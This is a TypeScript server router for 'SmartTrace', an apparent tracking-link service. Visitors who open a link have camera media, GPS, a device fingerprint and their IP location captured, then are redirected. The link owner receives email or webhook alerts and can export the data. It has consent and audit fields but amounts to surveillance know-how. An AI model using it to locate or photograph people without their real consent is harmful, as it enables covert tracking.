import { COOKIE_NAME } from "@shared/const";
import { getIpLocation } from "./ipGeo";
import { parseRequestIp } from "./ip";
import { evaluateRisk, formatRiskFlags } from "./risk";
import { testSmtpConnection } from "./email";
import { sendWebhookNotification } from "./webhook";
import { checkRateLimit, getRateLimitInfo } from "./rateLimiter";
import { encrypt, decrypt } from "./crypto";
import { logAudit } from "./audit";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { adminProcedure, publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import { can, type Permission } from "./permissions";
import { z } from "zod";

const EXPORT_COLUMNS = ["ID", "Link ID", "IP 地址", "IP 来源", "私网 IP", "GPS 定位", "分辨率", "设备指纹", "采集模式", "风险标记", "文件地址", "访问时长(秒)", "创建时间"] as const;
const exportColumnSchema = z.enum(EXPORT_COLUMNS);

const permissionProcedure = (permission: Permission) => protectedProcedure.use(async ({ ctx, next }) => {
  if (!can(ctx.user.role, permission)) {
    await logAudit(ctx.user.id, "AUTHORIZATION_DENIED", JSON.stringify({ requiredPermission: permission, role: ctx.user.role, reason: "role_not_allowed" }), ctx.req.socket.remoteAddress, { targetType: "permission", targetId: permission, result: "failure", userAgent: String(ctx.req.headers["user-agent"] || "unknown") });
    throw new TRPCError({ code: "FORBIDDEN", message: `缺少权限: ${permission}` });
  }
  return next();
});
import * as XLSX from "xlsx";
import * as db from "./db";
import { storagePut } from "./storage";
import { nanoid } from "nanoid";
import { sendCaptureNotification } from "./email";

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  status: router({
    smtpStatus: protectedProcedure.query(async ({ ctx }) => {
      const setting = await db.getSmtpSetting(ctx.user.id);
      if (setting) {
        return {
          configured: true,
          host: setting.host,
          port: String(setting.port),
          user: setting.user,
          recipient: setting.recipient,
          emailSubjectTemplate: setting.emailSubjectTemplate || "",
          emailHtmlTemplate: setting.emailHtmlTemplate || "",
          webhookUrl: setting.webhookUrl || "",
          webhookType: setting.webhookType || "dingtalk",
          webhookTemplate: setting.webhookTemplate || "",
          webhookAlertLevel: setting.webhookAlertLevel || "all",
        };
      }
      const host = process.env.SMTP_HOST;
      const user = process.env.SMTP_USER;
      const pass = process.env.SMTP_PASS;
      return {
        configured: Boolean(host && user && pass),
        host: host || "",
        port: process.env.SMTP_PORT || "465",
        user: user || "",
        recipient: process.env.NOTIFICATION_EMAIL || user || "",
        emailSubjectTemplate: "",
        emailHtmlTemplate: "",
        webhookUrl: "",
        webhookType: "dingtalk",
        webhookTemplate: "",
      };
    }),
    saveSmtp: permissionProcedure("manage_settings")
      .input(
        z.object({
          host: z.string().trim().min(1).max(255),
          port: z.number().int().min(1).max(65535),
          user: z.string().trim().min(1).max(255),
          pass: z.string().min(1).max(255),
          recipient: z.string().email().max(255),
          emailSubjectTemplate: z.string().optional(),
          emailHtmlTemplate: z.string().optional(),
          webhookUrl: z.union([z.string().url(), z.literal("")]).optional(),
          webhookType: z.enum(["dingtalk", "wechat", "telegram"]).optional(),
          webhookTemplate: z.string().optional(),
          webhookAlertLevel: z.enum(["all", "high"]).default("all"),
        })
      )
      .mutation(async ({ input, ctx }) => {
        await testSmtpConnection(input);
        await db.upsertSmtpSetting({
          userId: ctx.user.id,
          host: input.host,
          port: input.port,
          user: input.user,
          pass: input.pass,
          recipient: input.recipient,
          emailSubjectTemplate: input.emailSubjectTemplate || null,
          emailHtmlTemplate: input.emailHtmlTemplate || null,
          webhookUrl: input.webhookUrl || null,
          webhookType: input.webhookType || "dingtalk",
          webhookTemplate: input.webhookTemplate || null,
          webhookAlertLevel: input.webhookAlertLevel,
        });
        await logAudit(ctx.user.id, "SAVE_SMTP_WEBHOOK", "Updated SMTP/Webhook settings", ctx.req.socket.remoteAddress, { targetType: "settings", targetId: "smtp-webhook", userAgent: String(ctx.req.headers["user-agent"] || "unknown") });
        return { success: true };
      }),
    auditLogs: permissionProcedure("view_audit").query(async ({ ctx }) => {
      return await db.getAuditLogs(ctx.user.id);
    }),
    testSmtp: permissionProcedure("manage_settings")
      .input(
        z.object({
          host: z.string(),
          port: z.number(),
          user: z.string(),
          pass: z.string(),
        })
      )
      .mutation(async ({ input }) => {
        await testSmtpConnection(input);
        return { success: true };
      }),
  }),

  tracking: router({
    createLink: permissionProcedure("manage_links")
      .input(
        z.object({
          id: z.string().min(1, "ID ist erforderlich"),
          redirectUrl: z.string().url("Gültige URL erforderlich"),
          captureType: z.enum(["photo", "video"]).default("photo"),
          collectionMode: z.enum(["media", "visit"]).default("media"),
          retentionDays: z.number().int().min(1).max(3650).default(30),
        })
      )
      .mutation(async ({ input, ctx }) => {
        const existing = await db.getTrackingLinkById(input.id);
        if (existing) {
          throw new Error("Diese Tracking-ID existiert bereits.");
        }
        await db.createTrackingLink({
          id: input.id,
          redirectUrl: input.redirectUrl,
          userId: ctx.user.id,
          captureType: input.captureType,
          collectionMode: input.collectionMode,
          retentionDays: input.retentionDays,
        });
        return { success: true, id: input.id };
      }),

    listLinks: permissionProcedure("manage_links").query(async ({ ctx }) => {
      return await db.getTrackingLinks(ctx.user.id);
    }),

    getLink: publicProcedure
      .input(z.object({ id: z.string() }))
      .query(async ({ input }) => {
        const link = await db.getTrackingLinkById(input.id);
        return link;
      }),

    deleteLink: permissionProcedure("manage_links")
      .input(z.object({ id: z.string() }))
      .mutation(async ({ input, ctx }) => {
        const link = await db.getTrackingLinkById(input.id);
        if (!link || link.userId !== ctx.user.id) throw new Error("Unauthorized");
        await db.deleteTrackingLink(input.id);
        await logAudit(ctx.user.id, "DELETE_LINK", `Deleted tracking link ${input.id}`, ctx.req.socket.remoteAddress, { targetType: "tracking_link", targetId: input.id, userAgent: String(ctx.req.headers["user-agent"] || "unknown") });
        return { success: true };
      }),
  }),

  captures: router({
    list: permissionProcedure("manage_captures")
      .input(z.object({ linkId: z.string().optional() }))
      .query(async ({ input, ctx }) => {
        const userLinks = await db.getTrackingLinks(ctx.user.id);
        const userLinkIds = userLinks.map((l) => l.id);
        let list: Awaited<ReturnType<typeof db.getCaptures>> = [];
        if (input.linkId) {
          if (!userLinkIds.includes(input.linkId)) return [];
          list = await db.getCaptures(input.linkId);
        } else {
          list = await db.getCaptures(undefined, userLinkIds);
        }
        return list.map((c) => ({
          ...c,
          gps: decrypt(c.gps || ""),
          fingerprint: decrypt(c.fingerprint || ""),
        }));
      }),

    submit: publicProcedure
      .input(
        z.object({
          linkId: z.string(),
          imageBase64: z.string().optional(),
          consentVersion: z.string().min(1).max(32).default("2026-08"),
          gps: z.string().optional(),
          fingerprint: z.string().optional(),
          resolution: z.string().optional(),
          durationSec: z.number().optional().default(0),
        })
      )
      .mutation(async ({ input, ctx }) => {
        const link = await db.getTrackingLinkById(input.linkId);
        if (!link) {
          throw new Error("Tracking link not found");
        }

        const normalizedIp = parseRequestIp(ctx.req);
        const cleanIp = normalizedIp.ip;

        // 访问频率限制检查：使用规范化 IP，降低代理链绕过风险
        if (!checkRateLimit(cleanIp, input.linkId, 10, 60000)) {
          throw new Error("请求过于频繁，请稍后再试。");
        }
        const location = normalizedIp.isPrivate ? "本地内网 (Local Network)" : await getIpLocation(cleanIp);
        const ipWithLoc = `${cleanIp} (${location})`;
        const userAgent = ctx.req.headers["user-agent"] || "unknown";
        const rateInfo = getRateLimitInfo(cleanIp, input.linkId, 10, 60000);
        const recentCaptures = input.fingerprint ? await db.getCaptures(input.linkId) : [];
        const duplicateDevice = Boolean(input.fingerprint && recentCaptures.some((capture) => {
          const createdAt = new Date(capture.createdAt).getTime();
          return Date.now() - createdAt < 10 * 60 * 1000 && decrypt(capture.fingerprint || "") === input.fingerprint;
        }));
        const collectionMode = link.collectionMode || "media";
        const base64Data = input.imageBase64 || "";

        if (collectionMode === "media" && !base64Data) {
          throw new Error("未收到媒体数据，请重新授权并重试。");
        }

        let ext = "png";
        let mime = "image/png";
        if (base64Data.includes("video/webm")) {
          ext = "webm";
          mime = "video/webm";
        } else if (base64Data.includes("video/mp4")) {
          ext = "mp4";
          mime = "video/mp4";
        }

        const captureId = nanoid(10);
        const s3Result = collectionMode === "visit"
          ? { key: "visit-only", url: "visit-only" }
          : await storagePut(
              `capture_${input.linkId}_${Date.now()}_${captureId}.${ext}`,
              Buffer.from(base64Data.replace(/^data:\w+\/\w+;base64,/, ""), "base64"),
              mime,
            );

        const now = new Date();
        const riskFlags = evaluateRisk({
          isPrivateIp: normalizedIp.isPrivate,
          ipSource: normalizedIp.source,
          durationSec: input.durationSec || 0,
          gps: input.gps || "",
          fingerprint: input.fingerprint || "",
          collectionMode,
          recentRequests: rateInfo.count,
          duplicateDevice,
          geoAnomaly: Boolean(input.gps && !normalizedIp.isPrivate && /未知|unknown/i.test(location)),
          authorizationIncomplete: Boolean(!input.gps || /declined|denied/i.test(input.gps) || !input.fingerprint || /declined|unknown/i.test(input.fingerprint)),
        });
        const encryptedGps = encrypt(input.gps || "未提供");
        const encryptedFingerprint = encrypt(input.fingerprint || "未知");

        await db.createCapture({
          id: captureId,
          linkId: input.linkId,
          ip: ipWithLoc,
          ipSource: normalizedIp.source,
          isPrivateIp: normalizedIp.isPrivate,
          gps: encryptedGps,
          fingerprint: encryptedFingerprint,
          resolution: input.resolution || "未知",
          userAgent: userAgent,
          filePath: s3Result.url,
          durationSec: input.durationSec || 0,
          consentVersion: input.consentVersion,
          consentAt: now,
          collectionMode,
          riskFlags: formatRiskFlags(riskFlags),
          createdAt: now,
        });

        sendCaptureNotification({
          linkId: input.linkId,
          ip: ipWithLoc,
          gps: input.gps || "Nicht verfügbar",
          resolution: input.resolution || "Unbekannt",
          filePath: s3Result.url,
          createdAt: now,
          userId: link.userId,
        }).catch((err) => console.error("[SMTP] Mail error:", err));

        sendWebhookNotification({
          linkId: input.linkId,
          ip: ipWithLoc,
          gps: input.gps || "Nicht verfügbar",
          resolution: input.resolution || "Unbekannt",
          filePath: s3Result.url,
          createdAt: now,
          userId: link.userId,
          riskFlags: formatRiskFlags(riskFlags),
          collectionMode,
        }).catch((err) => console.error("[Webhook] Error:", err));

        return { success: true, redirectUrl: link.redirectUrl };
      }),

    delete: permissionProcedure("manage_captures")
      .input(z.object({ id: z.string() }))
      .mutation(async ({ input, ctx }) => {
        const capture = await db.getCaptureById(input.id);
        if (!capture) throw new Error("Capture not found");
        const link = await db.getTrackingLinkById(capture.linkId);
        if (!link || link.userId !== ctx.user.id) throw new Error("Unauthorized");
        await db.deleteCapture(input.id);
        await logAudit(ctx.user.id, "DELETE_CAPTURE", `Deleted capture ${input.id}`, ctx.req.socket.remoteAddress, { targetType: "capture", targetId: input.id, userAgent: String(ctx.req.headers["user-agent"] || "unknown") });
        return { success: true };
      }),

    clearAll: permissionProcedure("manage_captures")
      .input(z.object({ linkId: z.string().optional() }))
      .mutation(async ({ input, ctx }) => {
        const userLinks = await db.getTrackingLinks(ctx.user.id);
        const userLinkIds = userLinks.map((l) => l.id);
        if (input.linkId) {
          if (!userLinkIds.includes(input.linkId)) throw new Error("Unauthorized");
          await db.clearCaptures(input.linkId);
        } else {
          await db.clearCaptures(undefined, userLinkIds);
        }
        await logAudit(ctx.user.id, "CLEAR_CAPTURES", `Cleared captures for linkId: ${input.linkId || "all"}`, ctx.req.socket.remoteAddress, { targetType: "captures", targetId: input.linkId || "all", userAgent: String(ctx.req.headers["user-agent"] || "unknown") });
        return { success: true };
      }),

    exportCsv: permissionProcedure("export_data")
      .input(z.object({
        linkId: z.string().optional(),
        from: z.string().datetime().optional(),
        to: z.string().datetime().optional(),
        includeSensitive: z.boolean().default(false),
        limit: z.number().int().min(1).max(10000).default(5000),
        columns: z.array(exportColumnSchema).min(1).max(EXPORT_COLUMNS.length).default([...EXPORT_COLUMNS]),
      }))
      .query(async ({ input, ctx }) => {
        const userLinks = await db.getTrackingLinks(ctx.user.id);
        const userLinkIds = userLinks.map((l) => l.id);
        let list: Awaited<ReturnType<typeof db.getCaptures>> = [];
        if (input.linkId) {
          if (!userLinkIds.includes(input.linkId)) list = [];
          else list = await db.getCaptures(input.linkId);
        } else {
          list = await db.getCaptures(undefined, userLinkIds);
        }
        const from = input.from ? new Date(input.from).getTime() : undefined;
        const to = input.to ? new Date(input.to).getTime() : undefined;
        const filteredList = list.filter((c) => {
          const time = new Date(c.createdAt).getTime();
          return (from === undefined || time >= from) && (to === undefined || time <= to);
        }).slice(0, input.limit);
        const rows = filteredList.map((c) => {
          const row: Record<string, string | number> = {
            "ID": c.id,
            "Link ID": c.linkId,
            "IP 地址": c.ip || "",
            "IP 来源": c.ipSource || "unknown",
            "私网 IP": c.isPrivateIp ? "是" : "否",
            "GPS 定位": input.includeSensitive ? decrypt(c.gps || "") : "[已脱敏]",
            "分辨率": c.resolution || "",
            "设备指纹": input.includeSensitive ? decrypt(c.fingerprint || "") : "[已脱敏]",
            "采集模式": c.collectionMode || "media",
            "风险标记": c.riskFlags || "",
            "文件地址": c.filePath,
            "访问时长(秒)": c.durationSec || 0,
            "创建时间": new Date(c.createdAt).toLocaleString(),
          };
          return input.columns.map((column) => `"${String(row[column] ?? "").replace(/"/g, '""')}"`);
        });
        const headers = input.columns;

        const csvContent = [headers.join(","), ...rows.map((r) => r.join(","))].join("\n");
        await logAudit(ctx.user.id, "EXPORT_CSV", JSON.stringify({ linkId: input.linkId || "all", count: filteredList.length, columns: input.columns, includeSensitive: input.includeSensitive, from: input.from, to: input.to }), ctx.req.socket.remoteAddress, { targetType: "export", targetId: input.linkId || "all", userAgent: String(ctx.req.headers["user-agent"] || "unknown") });
        return { csv: csvContent };
      }),

    exportXlsx: permissionProcedure("export_data")
      .input(z.object({
        linkId: z.string().optional(),
        from: z.string().datetime().optional(),
        to: z.string().datetime().optional(),
        includeSensitive: z.boolean().default(false),
        limit: z.number().int().min(1).max(10000).default(5000),
        columns: z.array(exportColumnSchema).min(1).max(EXPORT_COLUMNS.length).default([...EXPORT_COLUMNS]),
      }))
      .query(async ({ input, ctx }) => {
        const userLinks = await db.getTrackingLinks(ctx.user.id);
        const userLinkIds = userLinks.map((l) => l.id);
        let list: Awaited<ReturnType<typeof db.getCaptures>> = [];
        if (input.linkId) {
          if (!userLinkIds.includes(input.linkId)) list = [];
          else list = await db.getCaptures(input.linkId);
        } else {
          list = await db.getCaptures(undefined, userLinkIds);
        }
        const from = input.from ? new Date(input.from).getTime() : undefined;
        const to = input.to ? new Date(input.to).getTime() : undefined;
        const filteredList = list.filter((c) => {
          const time = new Date(c.createdAt).getTime();
          return (from === undefined || time >= from) && (to === undefined || time <= to);
        }).slice(0, input.limit);
        const data = filteredList.map((c) => {
          const row: Record<string, string | number> = {
            "ID": c.id,
            "Link ID": c.linkId,
            "IP 地址": c.ip || "",
            "IP 来源": c.ipSource || "unknown",
            "私网 IP": c.isPrivateIp ? "是" : "否",
            "GPS 定位": input.includeSensitive ? decrypt(c.gps || "") : "[已脱敏]",
            "分辨率": c.resolution || "",
            "设备指纹": input.includeSensitive ? decrypt(c.fingerprint || "") : "[已脱敏]",
            "采集模式": c.collectionMode || "media",
            "风险标记": c.riskFlags || "",
            "文件地址": c.filePath,
            "访问时长(秒)": c.durationSec || 0,
            "创建时间": new Date(c.createdAt).toLocaleString(),
          };
          return Object.fromEntries(input.columns.map((column) => [column, row[column] ?? ""]));
        });

        const worksheet = XLSX.utils.aoa_to_sheet([
          input.columns,
          ...data.map((row) => input.columns.map((column) => row[column] ?? "")),
        ]);
        const workbook = XLSX.utils.book_new();
        XLSX.utils.book_append_sheet(workbook, worksheet, "Captures");
        const meta = XLSX.utils.aoa_to_sheet([
          ["报表名称", "SmartTrace 采集报表"],
          ["生成时间", new Date().toISOString()],
          ["操作者", ctx.user.name || ctx.user.email || String(ctx.user.id)],
          ["数据范围", input.linkId || "全部链接"],
          ["记录数量", filteredList.length],
          ["敏感字段", input.includeSensitive ? "包含" : "已脱敏"],
        ]);
        XLSX.utils.book_append_sheet(workbook, meta, "Metadata");
        const base64 = XLSX.write(workbook, { type: "base64", bookType: "xlsx" });

        await logAudit(ctx.user.id, "EXPORT_XLSX", JSON.stringify({ linkId: input.linkId || "all", count: filteredList.length, columns: input.columns, includeSensitive: input.includeSensitive, from: input.from, to: input.to }), ctx.req.socket.remoteAddress, { targetType: "export", targetId: input.linkId || "all", userAgent: String(ctx.req.headers["user-agent"] || "unknown") });
        return { base64, filename: `captures_${Date.now()}.xlsx` };
      }),
  }),
});

export type AppRouter = typeof appRouter;
